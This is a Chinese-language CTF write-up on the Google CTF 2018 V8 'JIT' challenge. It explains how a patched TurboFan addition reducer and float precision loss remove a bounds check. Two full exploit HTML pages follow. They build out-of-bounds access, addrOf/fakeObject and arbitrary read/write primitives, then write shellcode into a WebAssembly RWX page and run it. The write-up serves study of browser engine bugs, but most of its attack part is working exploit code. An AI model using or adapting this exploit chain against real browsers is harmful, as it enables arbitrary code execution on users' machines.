## Google CTF 2018 JIT

#### 环境搭建

```bash
git checkout 7.0.276.3 
gclient sync 
git apply ../../../google_ctf_2018_jit/addition-reducer.patch
tools/dev/v8gen.py x64.debug
# 允许优化checkbounds
echo "v8_untrusted_code_mitigations = false" >> out.gn/x64.debug/args.gn
ninja -C out.gn/x64.debug
```



#### 前置知识

**1.浮点数精度丢失**

根据IEEE754标准，64浮点数所能精确表示的最大整数是9007199254740991，如果超出这个界限，浮点数只能保留高位的数据，低位的数据将被舍弃，此时数值无法完整表示，存在精度丢失。例如：

![image-20220209185241032](https://s2.loli.net/2022/02/10/aF59Zb2v1KC7ByX.png)



**2.turbofan中的checkbounds优化**

`CheckBounds`是用于检查JS数组是否越界所设置的结点，在SimplifiedLoweringPhase中可能会得到优化，相关代码在src/compiler/simplified-lowering.cc

```c++
 void VisitCheckBounds(Node* node, SimplifiedLowering* lowering) {
    CheckParameters const& p = CheckParametersOf(node->op());
    Type const index_type = TypeOf(node->InputAt(0));
    Type const length_type = TypeOf(node->InputAt(1));
    if (length_type.Is(Type::Unsigned31())) {
      if (index_type.Is(Type::Integral32OrMinusZero())) {
        // Map -0 to 0, and the values in the [-2^31,-1] range to the
        // [2^31,2^32-1] range, which will be considered out-of-bounds
        // as well, because the {length_type} is limited to Unsigned31.
        VisitBinop(node, UseInfo::TruncatingWord32(),
                   MachineRepresentation::kWord32);
        if (lower()) {
          CheckBoundsParameters::Mode mode =
              CheckBoundsParameters::kDeoptOnOutOfBounds;
          if (lowering->poisoning_level_ ==
                  PoisoningMitigationLevel::kDontPoison &&
              (index_type.IsNone() || length_type.IsNone() ||
               (index_type.Min() >= 0.0 &&
                index_type.Max() < length_type.Min()))) {	//
            // The bounds check is redundant if we already know that
            // the index is within the bounds of [0.0, length[.
            //设置优化
            mode = CheckBoundsParameters::kAbortOnOutOfBounds;
          }
          NodeProperties::ChangeOp(
              node, simplified()->CheckedUint32Bounds(p.feedback(), mode));
        }
	...
  }
```

可以看到，当index的最大值小于length的最小值时，表示数组没有越界，`CheckBounds`结点将被去除。

以下是CheckBounds优化的例子

```javascript
function f(x)
{   var arr = [1.1, 2.2, 3.3, 4.4];
    let t = (x == 1 ? 1 : 3);
    return arr[t];
}

console.log(f(1));
%OptimizeFunctionOnNextCall(f);
console.log(f(1));
```

优化之前有一个CheckBounds结点

![image-20220209201740760](https://s2.loli.net/2022/02/10/AsDvSQnB6iNhzcf.png)

经过SimplifiedLoweringPhase，Checkbounds被优化了

![image-20220209202107469](https://s2.loli.net/2022/02/10/dErxWhiw6M2baQB.png)



#### 漏洞分析

首先分析patch文件

```c++
...
+Reduction DuplicateAdditionReducer::Reduce(Node* node) {
+  switch (node->opcode()) {
+    case IrOpcode::kNumberAdd:
+      return ReduceAddition(node);
+    default:
+      return NoChange();
+  }
+}
+Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) {
+  DCHECK_EQ(node->op()->ControlInputCount(), 0);
+  DCHECK_EQ(node->op()->EffectInputCount(), 0);
+  DCHECK_EQ(node->op()->ValueInputCount(), 2);
+
    //获取根结点的左结点
+  Node* left = NodeProperties::GetValueInput(node, 0);
    //判断根结点类型是否与左节点相同，即为NumberAdd
+  if (left->opcode() != node->opcode()) {
+    return NoChange();
+  }
+	
    //获取根结点的右结点
+  Node* right = NodeProperties::GetValueInput(node, 1);
    //判断结点类型是否与为NumberConstant
+  if (right->opcode() != IrOpcode::kNumberConstant) {
+    return NoChange();
+  }
+
    //获取左结点的左右结点
+  Node* parent_left = NodeProperties::GetValueInput(left, 0);
+  Node* parent_right = NodeProperties::GetValueInput(left, 1);
+  if (parent_right->opcode() != IrOpcode::kNumberConstant) {
+    return NoChange();
+  }
+
+  double const1 = OpParameter<double>(right->op());
+  double const2 = OpParameter<double>(parent_right->op());
    //两个NumberConstant类型的结点合并
+  Node* new_const = graph()->NewNode(common()->NumberConstant(const1+const2));
+
+  NodeProperties::ReplaceValueInput(node, parent_left, 0);
+  NodeProperties::ReplaceValueInput(node, new_const, 1);
+
+  return Changed(node);
+}
+
+}  // namespace compiler
+}  // namespace internal
+}  // namespace v8
...
```

该优化方式将形如` x + 1 + 2`优化成`x + 3`，如下图

![image-20220209220735597](https://s2.loli.net/2022/02/10/Z9J8wMW5Y1o4y7b.png)

由之前的浮点数精度丢失可知`x + 1 + 1 <  x + 2`，NumberAdd结点range值将小于结点本身的值。



下面直接分析poc代码

```javascript
function f(x)
{   let float_arr = [1.1, 2.2, 3.3, 4.4];
    let t = (x == 1 ? 9007199254740992 : 9007199254740989);
    t = t + 1 + 1;
    t -= 9007199254740989; 
    console.log('arr[t]:',float_arr[t]);   
}

f(1);
%OptimizeFunctionOnNextCall(f);
f(1);
```

在Typer阶段，还未进行`x + 1 + 1 -> x + 2`的优化，t为`range(9007199254740989,9007199254740992)`，执行` t = t + 1 + 1;`后，t为`range(9007199254740991,9007199254740992)`，最终t为`range(2,3)`。如下图

![image-20220209230130422](https://s2.loli.net/2022/02/10/8jPwUXglFbDGYu6.png)

在TypedLowering阶段，进行`x + 1 + 1 -> x + 2`的优化，t为`range(9007199254740989,9007199254740992)`，执行` t = t + 2;`后，t为`range(9007199254740991,9007199254740994)`，最终t为`range(2,5)`。正确优化应该如下图

![image-20220209231013852](https://s2.loli.net/2022/02/10/noHBuZa8x4gWRDI.png)

但是题目中的代码只是将两个NumberConst合并，并没有更新根节点NumberAdd的range，所以在turbofan中NumberAdd结点仍然是未优化前的`range(9007199254740991,9007199254740992)`，如下图

![image-20220209231431893](https://s2.loli.net/2022/02/10/8oIPzi69JXjhYKV.png)

可以看到NumberAdd本身的最大值`9007199254740992+2 = 9007199254740994`大于range最大值`9007199254740992`，最终NumberAdd本身的最大值5大于range最大值3。
在SimplifLowing阶段，turbofan认为t最大值为3，小于数组长度4，因此将被优化。这样用t访问数组就可以实现越界读写



#### 漏洞利用

poc代码中只能越界2个元素，为了扩大越界程度，可以对t进行乘法运行，这里我让数组越界四个元素,使之正好可以修改JSArray的length字段

```javascript
var arr = [1.1, 2.2, 3.3, 4.4];//
function f(x)
{   arr = [1.1, 2.2, 3.3, 4.4];
    let t = (x == 1 ? 9007199254740992 : 9007199254740989);
    t = t + 1 + 1;
    t -= 9007199254740989;  
    t -= 1;                 
    t *= 2;                 
    t -= 1;                 
    arr[t] = 1.0864618449742194e-311;	//int2float(0x200);
    console.log('arr[t]:',arr[t]);
}
f(1);
%OptimizeFunctionOnNextCall(f);
f(1);
%SystemBreak();
```

![image-20220209233922427](https://s2.loli.net/2022/02/10/e1BEQhU2wnKqtT8.png)

可以看到数组长度已经被修改为0x200，这样就可以读写大量数据

若此时越界访问如`arr[100]`在debug版本下会触发FixedArray的DCHECK检查（release版本不会），可以注释相应的检查再重新编译

![image-20220209235117586](https://s2.loli.net/2022/02/10/3CIcjOZasEUWBx9.png)



之后创建`ArrayBuffer`和`DataView`，并利用越界读写backing_store指针实现任意地址读写，之后就是wasm一把梭。



最终exp

```html
<script>
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var Uint32 = new Int32Array(buf);

function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}

function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}


function hex(i){
    return '0x' + i.toString(16).padStart(16, '0');
}

var arr = [1.1, 2.2, 3.3, 4.4];//

function f(x)
{   arr = [1.1, 2.2, 3.3, 4.4];
    let t = (x == 1 ? 9007199254740992 : 9007199254740989);
    t = t + 1 + 1;          //range(9007199254740991,9007199254740992)|range(9007199254740991,9007199254740994)
    t -= 9007199254740989;  //range(2,3)|range(2,5)
    t -= 1;                 //range(1,2)|range(1,4)
    t *= 2;                 //range(2,4)|range(2,8)
    t -= 1;                 //range(1,3)|range(1,7)
    arr[t] = 1.0864618449742194e-311;
    console.log('arr[t]:',arr[t]);
}

f(1);
for(let i=0;i<0x10000;i++) {
    f(1);
}
f(1);

var back_store_index = -1;
var _buf = new ArrayBuffer(0xaaa);
var dataview = new DataView(_buf);

for(let i=0;i<0x100;i++) {
    //console.log(i,':',hex(f2i(arr[i])));
    if (arr[i] === i2f(0x00000aaa00000000n)) {
        
        back_store_index = i+1;
        break;
    }
}

function arb_read(addr) {
    arr[back_store_index] = i2f(addr);
    //%SystemBreak();
    return dataview.getBigInt64(0, true);
    
}

function arb_write(addr,value) {
    arr[back_store_index] = i2f(addr);
    data_view.setBigInt64(0, BigInt(value), true);
}

console.log('[*]back_store_index:',hex((back_store_index)));
var back_store_addr = f2i(arr[back_store_index]);
console.log('[*]back_store_addr:',hex((back_store_addr)));

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
var rwx_page_index = -1;
var obj = {guide:i2f(0xaaaaaaaan), wasmInstanceaddr:wasmInstance};


for(let i=0;i<0x200;i++) {
    //console.log(i,':',hex(f2i(arr[i])));
    if (arr[i] === i2f(0xaaaaaaaan)) {   
        rwx_page_index = i+1;
        break;
    }
}

console.log('[*]rwx_page_index:',hex((rwx_page_index)));
var wasm_instance_addr = f2i(arr[rwx_page_index]) - 1n;
console.log('[*]wasm_instance_addr:',hex((wasm_instance_addr)));
var rwx_page_addr = arb_read(wasm_instance_addr+0xe8n);

console.log('[*]rwx_page_addr:',hex((rwx_page_addr)));

const shellcode = [72, 49, 201, 72, 129, 233, 247, 255, 255, 255, 72, 141, 5, 239, 255, 255, 255, 72, 187, 124, 199, 145, 218, 201, 186, 175, 93, 72, 49, 88, 39, 72, 45, 248, 255, 255, 255, 226, 244, 22, 252, 201, 67, 129, 1, 128, 63, 21, 169, 190, 169, 161, 186, 252, 21, 245, 32, 249, 247, 170, 186, 175, 21, 245, 33, 195, 50, 211, 186, 175, 93, 25, 191, 225, 181, 187, 206, 143, 25, 53, 148, 193, 150, 136, 227, 146, 103, 76, 233, 161, 225, 177, 217, 206, 49, 31, 199, 199, 141, 129, 51, 73, 82, 121, 199, 145, 218, 201, 186, 175, 93];
var wasm_instance_addr = f2i(arr[0xbb+3])-1n;
arr[back_store_index] = i2f(rwx_page_addr);//set back_store

for(let i=0;i<shellcode.length;i++)
{
    dataview.setUint32(i,shellcode[i],true);
}

f();

</script>
```

执行命令时要加上`--no-sandbox`

```bash
chrome/chrome --no-sandbox /mnt/hgfs/Desktop/exp.html
```



由于之前正好复现了*ctf2019的oob，便按照该题利用方法写了一份exp

```html
<script>
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var Uint32 = new Int32Array(buf);

function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}

function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}

function hex(i){
    return '0x' + i.toString(16).padStart(16, '0');
}

var float_arr = [1.1, 2.2, 3.3, 4.4, 5.5];//
var obj_arr = [float_arr, float_arr, float_arr, float_arr];
function f(x)
{   float_arr = [1.1, 2.2, 3.3, 4.4];
    obj_arr = [float_arr, float_arr, float_arr, float_arr];
    let t = (x == 1 ? 9007199254740992 : 9007199254740989);
    t = t + 1 + 1;          //range(9007199254740991,9007199254740992)|range(9007199254740991,9007199254740994)
    t -= 9007199254740989;  //range(2,3)|range(2,5)
    t -= 1;                 //range(1,2)|range(1,4)
    t *= 2;                 //range(2,4)|range(2,8)
    t -= 1;                 //range(1,3)|range(1,7)
    float_arr[t] = 1.0864618449742194e-311;
    console.log('arr[t]:',t); 
}


f(1);

for(let i=0;i<0x10000;i++) {
     f(1);
}

f(1);
var float_arr_map_idx =4;
var obj_arr_map_idx = 14;
var float_arr_map = float_arr[float_arr_map_idx];
var obj_arr_map = float_arr[obj_arr_map_idx];

console.log('[*]float_arr_map:',hex(f2i(float_arr_map)));
console.log('[*]obj_arr_map:',hex(f2i(obj_arr_map)));

function addressOf(obj2leak) {
    obj_arr[0] = obj2leak;
    float_arr[obj_arr_map_idx] = float_arr_map;
    let re = obj_arr[0];    //leaked_addr
    float_arr[obj_arr_map_idx] = obj_arr_map;
    return f2i(re)-1n;
}

function fakeObject(addr2fake) {
    float_arr[obj_arr_map_idx] = float_arr_map;
    obj_arr[0] = i2f(addr2fake+1n);
    float_arr[obj_arr_map_idx] = obj_arr_map;
    return obj_arr[0];
}

var fake_arr_to_obj = [
    float_arr_map,  //map
    i2f(0n),    //properties
    i2f(0xdeaddeadn),   //elements
    i2f(0x1000000000n),     //length
    1.1,2.2
];

var fake_obj_addr = addressOf(fake_arr_to_obj);

var fake_obj = fakeObject(fake_obj_addr-0x30n);
console.log('[*]fake_obj_addr:',hex((fake_obj_addr)));

function arb_read(read_addr) {
    console.log('readaddr:',hex(read_addr));
    fake_arr_to_obj[2] = i2f(read_addr-0x10n+1n);

    var leaked_data = fake_obj[0];
    console.log('from:',hex(read_addr),'read:',hex(f2i(leaked_data)));
    return f2i(leaked_data);
}

function arb_write(write_addr, value) {
    console.log('writeaddr:',hex(write_addr));
    fake_arr_to_obj[2] = i2f(write_addr-0x10n+1n);
    fake_obj[0] = i2f(value);
} 


var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
var wasm_instance_addr = addressOf(wasmInstance);
console.log("[+]leak wasm instance addr: " + hex(wasm_instance_addr));
var rwx_page_addr = arb_read(wasm_instance_addr + 0xe8n);
console.log("[+]leak rwx_page_addr: " + hex(rwx_page_addr));

const shellcode = [72, 49, 201, 72, 129, 233, 247, 255, 255, 255, 72, 141, 5, 239, 255, 255, 255, 72, 187, 124, 199, 145, 218, 201, 186, 175, 93, 72, 49, 88, 39, 72, 45, 248, 255, 255, 255, 226, 244, 22, 252, 201, 67, 129, 1, 128, 63, 21, 169, 190, 169, 161, 186, 252, 21, 245, 32, 249, 247, 170, 186, 175, 21, 245, 33, 195, 50, 211, 186, 175, 93, 25, 191, 225, 181, 187, 206, 143, 25, 53, 148, 193, 150, 136, 227, 146, 103, 76, 233, 161, 225, 177, 217, 206, 49, 31, 199, 199, 141, 129, 51, 73, 82, 121, 199, 145, 218, 201, 186, 175, 93];
var buf = new ArrayBuffer(0x1a0);
var dataview = new DataView(buf);
var buf_addr = addressOf(buf);
back_store_addr = buf_addr+0x20n;
arb_write(back_store_addr,rwx_page_addr);

for(let i=0;i<shellcode.length;i++)
{
    dataview.setUint32(i,shellcode[i],true);
}

f();

console.log("[+]back_store_addr: "+hex(back_store_addr));
//%SystemBreak();
</script>

```



#### 参考

1. [浅析 V8-turboFan（下）](https://www.anquanke.com/post/id/229554)

2. [Introduction to TurboFan](https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/)